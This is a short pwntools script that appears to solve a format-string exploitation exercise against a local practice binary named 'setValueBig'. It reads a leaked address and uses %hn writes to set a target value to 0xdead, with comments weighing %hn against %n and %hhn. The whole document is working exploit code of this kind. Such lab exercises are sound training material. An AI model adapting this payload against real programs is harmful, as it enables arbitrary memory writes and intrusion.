#!/usr/bin/python3

## Use hn (rather than n or hhn)
## + Smaller payload [25]
## - More prone to timeout issues

from pwn import *

p = process('./setValueBig')

p.recvuntil("at address ")
val = int(p.recvline(keepends=False), 16)
log.info(f"Got address &someValue = {hex(val)}")

payload = b''
payload += p32(val)
payload += p32(val + 2)

# Write the first two bytes (0xdead == 57005) 
payload += f"%{0xdead - 8}c".encode()
payload += b"%5$hn"
payload += b"%4$hn"

log.info(f"PAYLOAD LENGTH = {len(payload)}")

# 0xde = 222
# 0xad = 173

p.sendline(payload)
p.interactive()